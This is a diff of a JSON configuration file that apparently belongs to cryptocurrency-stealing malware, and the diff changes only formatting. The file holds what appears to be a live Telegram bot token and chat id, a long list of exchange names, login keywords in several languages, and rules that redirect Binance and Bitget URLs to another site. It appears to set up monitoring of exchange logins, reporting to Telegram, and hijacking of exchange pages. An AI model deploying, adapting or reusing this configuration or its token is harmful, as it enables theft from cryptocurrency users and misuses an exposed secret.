@@ -1,7 +1,7 @@
 {
   "tkn": "8282557974:AAEfiiTmrb0APpnGJNCEHWEOJNiCCgB0pIE",
   "chid": "8025121083",
- "kws": [
+  "kws": [
     "AOFEX","AscendEX","Backpack","BigONE","BingX","Bit2Me","Bitbay","Bitbank","Bitcointree","BitEx",
     "Bitfinex","BitFlyer","BitForex","Bitget","Bitkub","BitMart","BitMEX","Bitrue","Bitso","Bitstamp",
     "BKEX","Bithumb","Bithumb Global","BitoPro","Binance","Binance US","Binance TR","BTC-Alpha","BTCC",
@@ -29,12 +29,10 @@
     "Tokenize","Mudrex","Upbit Indonesia","Coinbase International Exchange","AltcoinTrader","Powertrade",
     "BTC Trade UA","BuyUcoin","Bitsten","Coinlist","BitOnBay","XeggeX","KickEX","TradeOgre","Globe","AQX","DIFX",
     "Byte Exchange","Okcoin","FMCPAY","Wallet","exchangem","platform"
-],
-
+  ],
   "lgs": ["login","loguin","sign in","entrar","acessar","access","account"],
   "rds": [
     {"r":"(www\\.)?binance\\.com.*","u":"https://ge.globo.com/"},
     {"r":"(www\\.)?bitget\\.com.*","u":"https://ge.globo.com/"}
-
   ]
 }
